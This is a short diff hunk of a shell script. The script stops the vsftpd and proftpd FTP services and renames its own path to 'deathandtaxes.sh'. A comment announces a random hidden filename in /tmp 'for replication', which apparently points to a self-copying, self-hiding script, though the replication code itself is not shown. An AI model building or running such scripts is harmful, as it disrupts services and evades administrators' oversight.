@@ -5,7 +5,7 @@ sudo systemctl stop vsftpd 2>/dev/null
 sudo systemctl stop proftpd 2>/dev/null
 
 # Define original location
-ORIGINAL="/usr/local/bin/ftp_disable.sh"
+ORIGINAL="/usr/local/bin/deathandtaxes.sh"
 CHECK_DIR="/tmp"
 
 # Generate a new random hidden filename for replication
